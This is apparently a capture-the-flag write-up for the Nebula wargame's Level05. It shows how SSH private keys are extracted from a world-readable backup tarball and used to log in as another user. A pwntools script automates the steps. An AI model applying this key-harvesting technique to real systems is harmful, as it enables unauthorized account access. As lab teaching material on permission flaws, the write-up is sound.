# Level05

#### Description

Check the **flag05** home directory. You are looking for weak directory permissions

To do this level, log in as the **level05** account with the password **level05**. Files for this level can be found in /home/flag05.

#### Solution

```bash
level05@nebula:~$ cd /home/flag05
level05@nebula:/home/flag05$ ls -la
total 5
drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 .
drwxr-xr-x 1 root   root      60 2012-08-27 07:18 ..
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup
-rw-r--r-- 1 flag05 flag05   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag05 flag05  3353 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 flag05 flag05   675 2011-05-18 02:54 .profile
drwx------ 2 flag05 flag05    70 2011-11-20 20:13 .ssh
level05@nebula:/home/flag05$ cd .backup
level05@nebula:/home/flag05/.backup$ ls -la
total 2
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .
drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 ..
-rw-rw-r-- 1 flag05 flag05  1826 2011-11-20 20:13 backup-19072011.tgz
```

Looking inside /home/flag05 directory, we can see a .backup directory and inside that a compressed backup file is stored, we can simply extract it but not in that same directory as we do not have write permission over there.

```bash
level05@nebula:/home/flag05/.backup$ cd /tmp
level05@nebula:/tmp$ tar -xvzf /home/flag05/.backup/backup-19072011.tgz
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys
level05@nebula:/tmp$ ls -la
total 0
drwxrwxrwt 7 root    root    140 2025-09-28 02:56 .
drwxr-xr-x 1 root    root    220 2025-09-28 08:20 ..
drwxrwxrwt 2 root    root     40 2025-09-28 08:20 .ICE-unix
drwxr-xr-x 2 level05 level05 100 2011-07-19 02:37 .ssh
drwxrwxrwt 2 root    root     40 2025-09-28 08:20 VMwareDnD
drwx------ 2 root    root    100 2025-09-28 08:20 vmware-root
drwxrwxrwt 2 root    root     40 2025-09-28 08:20 .X11-unix
```

And it extracted a folder named .ssh and some private information like id\_rsa keys etc. We can now simply use that id\_rsa key to log into flag05 account.&#x20;

```bash
level05@nebula:/tmp/.ssh$ ls -la
total 12
drwxr-xr-x 2 level05 level05  100 2011-07-19 02:37 .
drwxrwxrwt 7 root    root     140 2025-09-28 02:57 ..
-rw-r--r-- 1 level05 level05  394 2011-07-19 02:37 authorized_keys
-rwx--x--x 1 level05 level05 1675 2011-07-19 02:37 id_rsa
-rw-r--r-- 1 level05 level05  394 2011-07-19 02:37 id_rsa.pub
level05@nebula:/tmp/.ssh$ chmod 600 id_rsa
level05@nebula:/tmp/.ssh$ ssh -i id_rsa flag05@localhost
.......
flag05@nebula:~$ id
uid=994(flag05) gid=994(flag05) groups=994(flag05)
flag05@nebula:~$ getflag
You have successfully executed getflag on a target account
```

#### Python Automation

```python
from pwn import *
from sys import argv, exit

# Check if IP address is provided as an argument
if len(argv) < 2:
    sys.exit("IP address not found.")

# Establishes SSH connection with target IP address
session = ssh(host=argv[1], user='level05', password='level05')

# Extract that backup file in /tmp directory and give id_rsa file 600 permission.
session.run("cd /tmp && tar -xvzf /home/flag05/.backup/backup-19072011.tgz")
session.run("chmod 600 /tmp/.ssh/id_rsa")

# Start remote shell and trigger ssh connection to flag05 account
terminal = session.shell()
terminal.sendline("ssh -i /tmp/.ssh/id_rsa flag05@localhost")
terminal.interactive()
```

<figure><img src="../../../.gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>
